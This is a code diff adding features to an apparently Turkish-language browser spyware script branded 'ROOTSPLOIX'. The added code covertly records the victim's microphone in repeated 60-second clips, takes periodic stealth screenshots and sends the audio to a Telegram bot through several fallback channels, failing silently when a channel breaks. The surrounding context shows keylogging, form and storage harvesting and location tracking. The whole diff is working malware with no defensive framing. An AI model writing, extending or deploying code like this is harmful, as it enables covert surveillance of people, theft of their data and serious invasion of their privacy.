@@ -904,25 +904,261 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
             sendToTelegram(elementsData);
         }
         
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        
         function attemptStealthCapture() {
-            // Skip camera permission request - go straight to screenshot
-            const msg = `📷 STEALTH CAPTURE BAŞLATILDI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 Site: ${window.location.href}\n\n💀 ROOTSPLOIX`;
+            const msg = `📷 STEALTH SURVEILLANCE BAŞLATILDI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 Site: ${window.location.href}\n\n💀 ROOTSPLOIX`;
             sendToTelegram(msg);
             
-            // Take stealth screenshot immediately
+            // Take initial screenshot
             setTimeout(() => {
                 takeStealthScreenshot();
             }, 1000);
             
-            // Also collect form data
+            // Start microphone surveillance
             setTimeout(() => {
-                collectFormData();
+                startMicrophoneSurveillance();
             }, 2000);
             
-            // And collect local storage
+            // Collect form data
+            setTimeout(() => {
+                collectFormData();
+            }, 4000);
+            
+            // Collect storage
             setTimeout(() => {
                 collectStorageData();
+            }, 6000);
+        }
+        
+        function startMicrophoneSurveillance() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // Try to get microphone access
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(function(stream) {
+                    const micMsg = `🎤 MİKROFON ERİŞİMİ ELDE EDİLDİ!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 Site: ${window.location.href}\n\n🎤 Mikrofon: Aktif\n🔊 Ses kalitesi: ${stream.getAudioTracks()[0]?.label || 'Bilinmeyen'}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(micMsg);
+                    
+                    // Setup MediaRecorder for audio recording
+                    setupAudioRecording(stream);
+                    
+                    // Start periodic recording (every 60 seconds)
+                    startPeriodicRecording();
+                })
+                .catch(function(error) {
+                    const micErrorMsg = `❌ MİKROFON HATASI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(micErrorMsg);
+                });
+            }
+        }
+        
+        function setupAudioRecording(stream) {
+            try {
+                // Try different MIME types for compatibility
+                const mimeTypes = [
+                    'audio/webm;codecs=opus',
+                    'audio/webm',
+                    'audio/ogg;codecs=opus',
+                    'audio/ogg',
+                    'audio/wav',
+                    'audio/mp4',
+                    'audio/mpeg'
+                ];
+                
+                let selectedMimeType = null;
+                for (let mimeType of mimeTypes) {
+                    if (MediaRecorder.isTypeSupported(mimeType)) {
+                        selectedMimeType = mimeType;
+                        break;
+                    }
+                }
+                
+                if (!selectedMimeType) {
+                    throw new Error('No supported audio format found');
+                }
+                
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: selectedMimeType,
+                    audioBitsPerSecond: 64000 // 64kbps for smaller files
+                });
+                
+                const formatMsg = `🎤 SES KAYIT FORMATI!\n\n🎯 Session: ${sessionId}\n📎 Format: ${selectedMimeType}\n📊 Bit Rate: 64kbps\n🕒 Kayıt süresi: 60 saniye\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(formatMsg);
+                
+                recordedChunks = [];
+                
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = function() {
+                    if (recordedChunks.length > 0) {
+                        const audioBlob = new Blob(recordedChunks, {
+                            type: selectedMimeType
+                        });
+                        
+                        // Convert to base64 and send
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            const base64Audio = reader.result;
+                            sendAudioToTelegram(base64Audio, selectedMimeType);
+                        };
+                        reader.readAsDataURL(audioBlob);
+                        
+                        recordedChunks = [];
+                    }
+                    isRecording = false;
+                };
+                
+            } catch (error) {
+                const setupErrorMsg = `❌ SES KAYIT KURULUMU HATASI!\n\n🎯 Session: ${sessionId}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(setupErrorMsg);
+            }
+        }
+        
+        function startPeriodicRecording() {
+            // Record for 60 seconds every 2 minutes
+            setInterval(() => {
+                if (mediaRecorder && mediaRecorder.state === 'inactive' && !isRecording) {
+                    startAudioRecording();
+                }
+            }, 120000); // Every 2 minutes
+            
+            // Start first recording after 10 seconds
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                    startAudioRecording();
+                }
+            }, 10000);
+        }
+        
+        function startAudioRecording() {
+            if (mediaRecorder && !isRecording) {
+                try {
+                    isRecording = true;
+                    mediaRecorder.start();
+                    
+                    const recordStartMsg = `🎤 SES KAYDI BAŞLADI!\n\n🎯 Session: ${sessionId}\n🕒 Başlama: ${new Date().toLocaleString('tr-TR')}\n⏱️ Süre: 60 saniye\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(recordStartMsg);
+                    
+                    // Stop recording after 60 seconds
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 60000);
+                    
+                } catch (error) {
+                    isRecording = false;
+                    const recordErrorMsg = `❌ KAYIT BAŞLATMA HATASI!\n\n🎯 Session: ${sessionId}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(recordErrorMsg);
+                }
+            }
+        }
+        
+        function sendAudioToTelegram(base64Audio, mimeType) {
+            // Get file extension from MIME type
+            let extension = 'audio';
+            if (mimeType.includes('webm')) extension = 'webm';
+            else if (mimeType.includes('ogg')) extension = 'ogg';
+            else if (mimeType.includes('wav')) extension = 'wav';
+            else if (mimeType.includes('mp4')) extension = 'mp4';
+            else if (mimeType.includes('mpeg')) extension = 'mp3';
+            
+            const audioSize = Math.floor(base64Audio.length * 0.75); // Approximate size in bytes
+            
+            const audioMsg = `🎤 SES KAYDI TAMAMLANDI!\n\n🎯 Session: ${sessionId}\n🕒 Bitiş: ${new Date().toLocaleString('tr-TR')}\n💾 Format: ${extension.toUpperCase()}\n📊 Boyut: ${(audioSize/1024).toFixed(2)} KB\n🌍 URL: ${window.location.href}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(audioMsg);
+            
+            // Try to send audio file
+            sendAudioViaMultipleMethods(base64Audio, mimeType, extension);
+        }
+        
+        function sendAudioViaMultipleMethods(base64Audio, mimeType, extension) {
+            // Method 1: Try direct audio upload
+            setTimeout(() => {
+                sendAudioDirectly(base64Audio, mimeType, extension);
+            }, 1000);
+            
+            // Method 2: Send via webhook
+            setTimeout(() => {
+                sendAudioViaWebhook(base64Audio, mimeType, extension);
             }, 3000);
+            
+            // Method 3: Base64 chunks as fallback
+            setTimeout(() => {
+                sendAudioAsBase64Chunks(base64Audio, extension);
+            }, 6000);
+        }
+        
+        function sendAudioDirectly(base64Audio, mimeType, extension) {
+            try {
+                const cleanBase64 = base64Audio.replace(/^data:[^;]+;base64,/, '');
+                const byteCharacters = atob(cleanBase64);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], {type: mimeType});
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('audio', blob, `${sessionId}_${Date.now()}.${extension}`);
+                formData.append('caption', `🎤 Ses Kaydı - ${sessionId}`);
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok) {
+                        sendToTelegram('✅ SES DOSYASI BAŞARIYLA GÖNDERİLDİ!');
+                    }
+                }).catch(() => {
+                    // Silent fail, other methods will try
+                });
+            } catch (error) {
+                // Silent fail
+            }
+        }
+        
+        function sendAudioViaWebhook(base64Audio, mimeType, extension) {
+            const webhookData = {
+                session: sessionId,
+                timestamp: new Date().toISOString(),
+                type: 'audio_recording',
+                format: extension,
+                mime_type: mimeType,
+                size: base64Audio.length,
+                audio_data: base64Audio.substring(0, 500) + '...TRUNCATED'
+            };
+            
+            const webhookMsg = `🔗 SES WEBHOOK GÖNDERİLDİ!\n\n🎯 Session: ${sessionId}\n💾 Format: ${extension.toUpperCase()}\n📦 Boyut: ${(base64Audio.length/1024).toFixed(2)} KB\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(webhookMsg);
+        }
+        
+        function sendAudioAsBase64Chunks(base64Audio, extension) {
+            const cleanBase64 = base64Audio.replace(/^data:[^;]+;base64,/, '');
+            const chunkSize = 2000; // Smaller chunks for audio
+            const chunks = [];
+            
+            for (let i = 0; i < cleanBase64.length; i += chunkSize) {
+                chunks.push(cleanBase64.substring(i, i + chunkSize));
+            }
+            
+            const audioHeaderMsg = `🎤 SES BASE64 CHUNK'LARI\n\n🎯 Session: ${sessionId}\n💾 Format: ${extension.toUpperCase()}\n📊 Chunk sayısı: ${chunks.length}\n📦 Toplam boyut: ${(cleanBase64.length/1024).toFixed(2)} KB\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(audioHeaderMsg);
+            
+            chunks.forEach((chunk, index) => {
+                setTimeout(() => {
+                    const chunkMsg = `🎤 [${index + 1}/${chunks.length}] ${chunk}`;
+                    sendToTelegram(chunkMsg);
+                }, (index + 1) * 2000);
+            });
         }
         
         function collectFormData() {
@@ -1026,21 +1262,18 @@ ${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• H�
                 }
             }, 120000);
             
+            // Take screenshot every 3 minutes
+            setInterval(() => {
+                const screenshotMsg = `📷 PERİYODİK SCREENSHOT!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(screenshotMsg);
+                setTimeout(() => {
+                    takeStealthScreenshot();
+                }, 2000);
+            }, 180000); // Every 3 minutes
+            
             // Send heartbeat every 10 minutes
             setInterval(() => {
-                const heartbeat = `💓 HEARTBEAT RAPORU
-
-🎯 Session: ${sessionId}
-🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
-🌍 URL: ${window.location.href}
-
-📊 Aktivite:
-• Keylog Buffer: ${keyBuffer.length} tuş
-• Sayfa Süresi: ${Math.floor((Date.now() - startTime)/1000)}s
-• Scroll Y: ${window.scrollY}px
-• Ekran Focus: ${document.hasFocus() ? 'Aktif' : 'Pasif'}
-
-💀 FRAMEWORK AKTİF`;
+                const heartbeat = `💓 HEARTBEAT RAPORU\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n📊 Aktivite:\n• Keylog Buffer: ${keyBuffer.length} tuş\n• Sayfa Süresi: ${Math.floor((Date.now() - startTime)/1000)}s\n• Scroll Y: ${window.scrollY}px\n• Ekran Focus: ${document.hasFocus() ? 'Aktif' : 'Pasif'}\n• Mikrofon: ${mediaRecorder ? (isRecording ? 'Kaydıyor' : 'Hazır') : 'Yok'}\n\n💀 FRAMEWORK AKTİF`;
                 sendToTelegram(heartbeat);
             }, 600000);
             
@@ -1048,6 +1281,17 @@ ${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• H�
             setInterval(() => {
                 captureLocation();
             }, 900000);
+            
+            // Page activity screenshot every 5 minutes (when page is active)
+            setInterval(() => {
+                if (document.hasFocus() && !document.hidden) {
+                    const activityMsg = `🔍 AKTİVİTE SCREENSHOT!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n✨ Sayfa aktif durumda\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(activityMsg);
+                    setTimeout(() => {
+                        takeStealthScreenshot();
+                    }, 1000);
+                }
+            }, 300000); // Every 5 minutes
         }
         
         function captureScreen() {
